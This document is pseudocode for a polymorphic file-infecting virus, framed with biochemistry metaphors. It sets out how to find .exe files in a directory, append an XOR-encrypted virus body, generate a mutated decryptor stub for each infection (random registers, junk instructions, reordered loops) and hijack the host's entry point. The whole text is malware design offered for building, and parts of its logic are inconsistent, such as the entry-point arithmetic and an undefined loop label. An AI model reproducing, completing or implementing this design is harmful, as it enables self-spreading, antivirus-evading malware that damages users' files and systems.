//
// VIRUS CORE – CONSTANT REACTIVE CENTER (does not change)
//
FUNCTION VirusCore():
    // Find potential substrate executables in current directory
    FOR EACH file IN GetDirectoryFiles("*.exe"):
        IF file NOT already infected AND file has space for appendage:
            CALL InfectFile(file)
    // Hand control back to original host program (de‑chaperoned)
    JUMP to saved_host_entry_point

//
// INFECTION REACTION – SYNTHESIZE NEW VIRUS PARTICLE
//
FUNCTION InfectFile(target_file):
    // 1. Prepare the substrate
    original_entry = ReadEntryPoint(target_file)
    file_content   = ReadWholeFile(target_file)
    host_stub      = file_content[0 .. original_entry-1]  // data before code
    host_code      = file_content[original_entry .. end]

    // 2. Generate a random encryption key (catalyst)
    key = GenerateRandomByte()   // single byte for simplicity; real ones use longer keys

    // 3. Fetch the immutable virus core (the "genome")
    virus_body = BinarySnapshot(VirusCore)   // precise machine code of VirusCore

    // 4. Encrypt the core (reversible denaturation)
    encrypted_body = XOR_Encrypt(virus_body, key)

    // 5. Synthesize a *new* decryptor stub with a unique morphology
    decryptor_stub = PolymorphicDecryptor(key, length(virus_body))

    // 6. Assemble the viral particle
    new_virus = decryptor_stub + encrypted_body

    // 7. Append particle to the substrate, preserving host functionality
    infected_file = host_stub + new_virus + host_code
    // Update entry point to point at the start of our decryptor
    new_entry = offset(host_stub) + offset(new_virus) - offset(decryptor_stub)   // start of decryptor
    WriteEntryPoint(target_file, new_entry)
    WriteWholeFile(target_file, infected_file)
    MarkAsInfected(target_file)   // simple marker to avoid reinfection

//
// POLYMORPHIC DECRYPTOR GENERATOR – THE MORPHING CAPSID
//
FUNCTION PolymorphicDecryptor(key, body_length):
    // template logic:
    //   1. Load address of encrypted body
    //   2. Loop: XOR byte [address] with key, increment address, decrement counter
    //   3. Jump to decrypted body (VirusCore)
    //
    // We mutate the template by:
    //   a) Choosing random registers (e.g., EAX, ECX, EBX...) – avoid collisions.
    //   b) Inserting inert instructions (NOP equivalents: MOV EAX,EAX; ADD ESP,0; etc.)
    //   c) Reordering independent operations (commutative law)
    //   d) Varying loop structure (e.g., JMP‑based instead of LOOP, or zero‑check at start)

    // Select two unused registers for pointer and counter
    ptr_reg = PickRandomRegister()
    cnt_reg = PickAnotherRegister(ptr_reg)
    dead_reg = PickYetAnotherRegister(ptr_reg, cnt_reg)  // for garbage insertions

    decryptor = ""

    // Random prologue junk
    IF RandomChance(0.4):
        decryptor += EmitGarbage(dead_reg)   // e.g., "ADD dead_reg, 0x0" or "NOP"

    // Set pointer to the start of encrypted body (the address right after this stub)
    // We determine the runtime address using a CALL/POP trick or relative addressing.
    // For simplicity, we assume the stub knows its own length and calculates the offset.
    stub_length = EstimateCurrentStubLength()  // calculated beforehand
    decryptor += EmitGetEIP(ptr_reg)           // typical "CALL $+5; POP ptr_reg" or "MOV ptr_reg, [ESP]"
    decryptor += EmitAdjust(ptr_reg, stub_length)  // ptr_reg points now to encrypted body

    // Initialize counter with body length
    decryptor += EmitLoadImmediate(cnt_reg, body_length)

    // Decryption loop
    loop_label = RandomLabel()
    IF RandomBoolean():
        // Pre‑test loop
        decryptor += EmitTestOrCompare(cnt_reg, 0)
        decryptor += EmitJumpIfZero(loop_exit)
    decryptor += loop_label + ":"
    // XOR a byte with the key
    decryptor += EmitXorByteAtReg(ptr_reg, key)   // XOR [ptr_reg], key
    // Advance pointer
    decryptor += EmitIncrement(ptr_reg)
    // Decrement counter
    decryptor += EmitDecrement(cnt_reg)
    // Loop back if counter not zero
    decryptor += EmitJumpIfNotZero(loop_label)

    // Post‑test loop variant (alternative)
    IF RandomBoolean():
        // swap: do XOR, decrement, then check at bottom
        decryptor = EmitBottomCheckedLoop(ptr_reg, cnt_reg, key, body_length)  // re‑arranged

    decryptor += loop_exit + ":"

    // Random epilogue junk
    IF RandomChance(0.3):
        decryptor += EmitGarbage(dead_reg)

    // Jump to the now‑decrypted virus core
    decryptor += EmitJumpToReg(ptr_reg)  // or adjust to start of core, ptr_reg currently at end; so "SUB ptr_reg, body_length" before jump

    RETURN assemble(decryptor)


//
// AUXILIARY EMISSION ROUTINES (LAB REAGENTS)
//
FUNCTION EmitXorByteAtReg(reg, key):
    // machine code: 0x80 0x33 <reg> <key>   (simplified)
    RETURN binary_encoding("XOR BYTE [reg], key")

FUNCTION EmitGarbage(dead_reg):
    // Produce a harmless instruction that changes register values (or doesn't)
    variants = [
        "MOV dead_reg, dead_reg",
        "ADD dead_reg, 0",
        "NOP",
        "PUSH dead_reg; POP dead_reg",
        "XCHG dead_reg, dead_reg"
    ]
    RETURN RandomFrom(variants)

FUNCTION EmitGetEIP(ptr_reg):
    // CALL $+5: next instr address on stack; POP ptr_reg
    RETURN "CALL $+5" + "POP ptr_reg"

FUNCTION PrepareDecryptorSizeCalculation():
    // Dummy placeholder: in a real engine you'd assemble the stub first,
    // measure its length, then adjust the pointer arithmetic.
    RETURN
